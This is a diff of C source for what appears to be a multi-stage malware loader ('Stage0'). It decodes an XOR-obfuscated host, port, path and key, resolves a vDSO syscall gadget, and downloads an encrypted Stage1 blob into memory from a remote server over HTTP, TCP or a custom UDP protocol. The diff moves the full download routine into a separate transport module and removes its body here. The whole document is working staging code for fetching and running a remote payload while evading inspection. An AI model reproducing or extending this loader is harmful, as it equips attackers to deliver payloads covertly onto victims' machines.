@@ -1,8 +1,8 @@
 #define _GNU_SOURCE
-#include "net_utils.h"
 #include "packer.h"
 #include "rc4.h"
 #include "syscalls.h"
+#include "transport.h"
 #include "utils.h"
 
 /* Configurable Options - from Makefile */
@@ -24,18 +24,12 @@
 #ifndef MAX_STAGE_BLOB_SIZE
 #define MAX_STAGE_BLOB_SIZE (40 * 1024 * 1024)
 #endif
-#define BUFFER_SIZE 65536
 
 // XOR-encoded configuration arrays
 static const unsigned char encoded_host[] = {ENCODED_HOST};
 static const unsigned char encoded_port[] = {ENCODED_PORT};
 static const unsigned char encoded_path[] = {ENCODED_PATH};
 static const unsigned char encoded_key[] = {ENCODED_KEY};
-
-// Forward declarations
-static size_t download_stage1_blob(const char *host, const char *port,
-                                   const char *path, void *buffer,
-                                   size_t capacity, const uint8_t *key);
 
 static void downloader_main(void) {
   /* Resolve vDSO syscall gadget before any other syscalls */
@@ -53,8 +47,8 @@ static void downloader_main(void) {
   decode_config_string(key_str, encoded_key, sizeof(key_str));
   derive_key_from_string(key_str, key);
 
-  debug_print("Stage0: Downloading Stage1 blob from %s:%s%s\n", host, port,
-              path);
+  debug_print("Stage0: Downloading Stage1 blob from %s:%s%s via %s\n", host,
+              port, path, transport_name());
 
   void *stage_blob = (void *)mmap(NULL, MAX_STAGE_BLOB_SIZE,
                                   PROT_READ | PROT_WRITE,
@@ -64,8 +58,8 @@ static void downloader_main(void) {
     exit(1);
   }
 
-  size_t downloaded_size = download_stage1_blob(
-      host, port, path, stage_blob, MAX_STAGE_BLOB_SIZE, key);
+  size_t downloaded_size = transport_download(host, port, path, stage_blob,
+                                              MAX_STAGE_BLOB_SIZE, key);
 
   if (downloaded_size == 0) {
     debug_print("Stage0: download failed\n");
@@ -111,182 +105,3 @@ __asm__(".section .init,\"ax\",@progbits\n"
         "mov $60, %rax\n"
         "xor %rdi, %rdi\n"
         "syscall\n");
-
-static size_t download_stage1_blob(const char *host, const char *port,
-                                   const char *path, void *buffer,
-                                   size_t capacity, const uint8_t *key) {
-  int sockfd;
-  struct sockaddr_in serv_addr;
-  char temp_buffer[BUFFER_SIZE];
-  size_t data_size = 0;
-  unsigned int http_marker = 0;
-
-#ifndef LISTENER_UDP
-  (void)key; /* only the UDP listener uses the key (hello handshake) */
-#endif
-
-  memset(&serv_addr, 0, sizeof(serv_addr));
-  serv_addr.sin_family = AF_INET;
-
-  int port_num = 0;
-  const char *p = port;
-  while (*p) {
-    port_num = port_num * 10 + (*p - '0');
-    p++;
-  }
-  serv_addr.sin_port = htons(port_num);
-
-  if (inet_aton(host, &serv_addr.sin_addr) == 0) {
-    return 0;
-  }
-
-#ifdef LISTENER_UDP
-  sockfd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
-#else
-  sockfd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
-#endif
-
-  if (sockfd == -1) {
-    return 0;
-  }
-
-#ifndef LISTENER_UDP
-  if (connect(sockfd, (struct sockaddr *)&serv_addr, sizeof(serv_addr)) == -1) {
-    close(sockfd);
-    return 0;
-  }
-#endif
-
-#ifdef LISTENER_HTTP
-  char request[BUFFER_SIZE];
-  char *ptr = request;
-  memcpy(ptr, "GET ", 4);
-  ptr += 4;
-  size_t len = strlen(path);
-  memcpy(ptr, path, len);
-  ptr += len;
-  const char *mid = " HTTP/1.1\r\nHost: ";
-  size_t mid_len = 17;
-  memcpy(ptr, mid, mid_len);
-  ptr += mid_len;
-  len = strlen(host);
-  memcpy(ptr, host, len);
-  ptr += len;
-  const char *end = "\r\nConnection: close\r\n\r\n";
-  size_t end_len = 23;
-  memcpy(ptr, end, end_len);
-  ptr += end_len;
-  *ptr = '\0';
-
-  if (send(sockfd, request, strlen(request), 0) == -1) {
-    close(sockfd);
-    return 0;
-  }
-
-  int header_end = 0;
-  const char *delim = "\r\n\r\n";
-  while (1) {
-    long bytes_received = recv(sockfd, temp_buffer, BUFFER_SIZE, 0);
-    if (bytes_received <= 0)
-      break;
-
-    if (!header_end) {
-      for (long i = 0; i < bytes_received; i++) {
-        if ((unsigned char)temp_buffer[i] ==
-            (unsigned char)delim[http_marker]) {
-          http_marker++;
-          if (http_marker == 4) {
-            header_end = 1;
-            if (i + 1 < bytes_received) {
-              size_t body_len = (size_t)(bytes_received - (i + 1));
-              if (data_size + body_len > capacity)
-                goto done;
-              memcpy((char *)buffer + data_size, temp_buffer + i + 1, body_len);
-              data_size += body_len;
-            }
-            break;
-          }
-        } else {
-          http_marker =
-              ((unsigned char)temp_buffer[i] == (unsigned char)delim[0]) ? 1
-                                                                         : 0;
-        }
-      }
-    } else {
-      if (data_size + (size_t)bytes_received > capacity)
-        break;
-      memcpy((char *)buffer + data_size, temp_buffer, (size_t)bytes_received);
-      data_size += (size_t)bytes_received;
-    }
-  }
-#elif defined(LISTENER_TCP)
-  while (1) {
-    long bytes_received = recv(sockfd, temp_buffer, BUFFER_SIZE, 0);
-    if (bytes_received <= 0)
-      break;
-    if (data_size + (size_t)bytes_received > capacity)
-      break;
-    memcpy((char *)buffer + data_size, temp_buffer, (size_t)bytes_received);
-    data_size += (size_t)bytes_received;
-  }
-#elif defined(LISTENER_UDP)
-  struct sockaddr_in src_addr;
-  unsigned int src_len = sizeof(src_addr);
-  struct timeval tv;
-  tv.tv_sec = 1;
-  tv.tv_usec = 0;
-  setsockopt(sockfd, SOL_SOCKET, SO_RCVTIMEO, (const char *)&tv, sizeof tv);
-
-  uint32_t key_hash = 0;
-  for (int i = 0; i < DERIVED_KEY_LEN; i++) {
-    key_hash ^= ((uint32_t)key[i]) << ((i % 4) * 8);
-  }
-
-  char hello_packet[5];
-  hello_packet[0] = 0x02;
-  memcpy(hello_packet + 1, &key_hash, 4);
-  uint32_t expected_seq = 0;
-  int hello_retries = 0;
-
-  while (1) {
-    if (expected_seq == 0) {
-      if (sendto(sockfd, hello_packet, 5, 0, (struct sockaddr *)&serv_addr,
-                 sizeof(serv_addr)) == -1) {
-        close(sockfd);
-        return 0;
-      }
-    }
-    long bytes_received = recvfrom(sockfd, temp_buffer, BUFFER_SIZE, 0,
-                                   (struct sockaddr *)&src_addr, &src_len);
-    if (bytes_received <= 0) {
-      if (expected_seq == 0) {
-        hello_retries++;
-        if (hello_retries > 20)
-          break;
-        continue;
-      } else {
-        break;
-      }
-    }
-    if (bytes_received > 4) {
-      uint32_t seq = 0;
-      memcpy(&seq, temp_buffer, 4);
-      if (seq == expected_seq) {
-        size_t body_len = (size_t)bytes_received - 4;
-        if (data_size + body_len > capacity)
-          break;
-        memcpy((char *)buffer + data_size, temp_buffer + 4, body_len);
-        data_size += body_len;
-        expected_seq++;
-        sendto(sockfd, &seq, 4, 0, (struct sockaddr *)&src_addr, src_len);
-      } else if (seq < expected_seq) {
-        sendto(sockfd, &seq, 4, 0, (struct sockaddr *)&src_addr, src_len);
-      }
-    }
-  }
-#endif
-done:
-  close(sockfd);
-
-  return data_size;
-}
